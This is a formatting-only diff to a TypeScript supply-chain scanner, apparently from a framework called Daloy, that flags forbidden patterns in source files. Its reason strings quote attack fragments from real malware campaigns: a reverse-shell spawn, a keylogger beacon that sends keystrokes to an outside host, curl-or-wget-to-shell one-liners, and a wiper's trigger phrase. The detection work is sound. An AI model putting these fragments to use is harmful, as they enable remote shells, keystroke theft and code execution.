@@ -768,7 +768,7 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "shell-name literal (`/bin/sh`, `/bin/bash`, `/bin/zsh`, `/bin/dash`, `/bin/ksh`, " +
       "`/bin/ash`, `cmd.exe`) in source is the reverse-shell shell prefix used by the " +
       "`@naderabdi/merchant-advcash` payment-callback reverse-shell campaign " +
-      "(`cp.spawn(\"/bin/sh\", [])`, " +
+      '(`cp.spawn("/bin/sh", [])`, ' +
       "https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell); " +
       "Daloy core never shells out — remove this literal",
     keepStrings: true,
@@ -897,7 +897,7 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
     // without accents) and a few obvious obfuscations.
     re: /remise\s+[àa]\s+z[ée]ro/i,
     reason:
-      "`remise à zéro` (French: \"reset to zero\") is the destruction-trigger phrase the " +
+      '`remise à zéro` (French: "reset to zero") is the destruction-trigger phrase the ' +
       "`xlsx-to-json-lh` codebase-wiper campaign listens for on its socket.io C2 channel " +
       "before recursively deleting the consumer's project directory " +
       "(https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger); any " +
@@ -1207,7 +1207,7 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "`reect-login-page` typosquat keylogger family (16 packages from npm author " +
       "`lolapalooza`, including `react-1ogin-page`, `@reect-login-page/base`, and " +
       "`sty1ed-react-modal`) which exfiltrated every keystroke via " +
-      "`new Image().src = \"https://adlinczewska.pl/beaut-login/keylog.php?c=\" + keys` " +
+      '`new Image().src = "https://adlinczewska.pl/beaut-login/keylog.php?c=" + keys` ' +
       "(https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger); " +
       "any reference in `src/**` is a hard IOC",
     keepStrings: true,
@@ -1229,7 +1229,7 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "Node / Bun / Deno; library source for a backend HTTP framework has zero legitimate " +
       "reason to mention it, and it is the documented CORS-bypassing pixel-beacon exfil " +
       "primitive used by the `reect-login-page` typosquat keylogger family " +
-      "(`new Image().src = \"https://attacker/keylog.php?c=\" + keystrokes`) " +
+      '(`new Image().src = "https://attacker/keylog.php?c=" + keystrokes`) ' +
       "(https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger) — " +
       "remove this literal",
     keepStrings: false,
@@ -1327,7 +1327,7 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "shell-pipe-to-shell download-and-execute one-liner (`wget -O - URL | /bin/bash`, " +
       "`curl ... | sh`, `curl ... | bash`) — the canonical TTP from the 11 malicious Go " +
       "packages obfuscated-loader campaign, where each package reconstructs this string from " +
-      "an index-based string array and hands it to `exec.Command(\"/bin/sh\", \"-c\", ...)` " +
+      'an index-based string array and hands it to `exec.Command("/bin/sh", "-c", ...)` ' +
       "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
       "Daloy core never shells out, so any literal of this shape in `src/**` is a hard IOC",
     keepStrings: true,
@@ -1577,7 +1577,7 @@ function findLineCommentStart(s: string): number {
 
 export function findForbiddenRegistryExfilCalls(
   file: string,
-  source: string,
+  source: string
 ): readonly ForbiddenRegistryExfilCall[] {
   const out: ForbiddenRegistryExfilCall[] = [];
   const lines = source.split(/\r?\n/);
@@ -1634,20 +1634,17 @@ async function main(): Promise<void> {
   try {
     await stat(SRC_ROOT);
   } catch (err) {
-    console.error(
-      `verify-no-registry-exfiltration: cannot stat src/: ${(err as Error).message}`,
-    );
+    console.error(`verify-no-registry-exfiltration: cannot stat src/: ${(err as Error).message}`);
     process.exitCode = 1;
     return;
   }
   for await (const absolute of walk(SRC_ROOT)) {
-    const rel =
-      "src/" + relative(fileURLToPath(SRC_ROOT), absolute).replaceAll("\\", "/");
+    const rel = "src/" + relative(fileURLToPath(SRC_ROOT), absolute).replaceAll("\\", "/");
     const text = await readFile(absolute, "utf8");
     const findings = findForbiddenRegistryExfilCalls(rel, text);
     for (const f of findings) {
       console.error(
-        `${f.file}:${f.line}: forbidden registry-exfiltration primitive (${f.reason}): ${f.text}`,
+        `${f.file}:${f.line}: forbidden registry-exfiltration primitive (${f.reason}): ${f.text}`
       );
       total++;
     }
@@ -1689,7 +1686,7 @@ async function main(): Promise<void> {
         "https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger, " +
         "https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban, " +
         "https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published, " +
-        "and https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch.",
+        "and https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch."
     );
     process.exitCode = 1;
   }
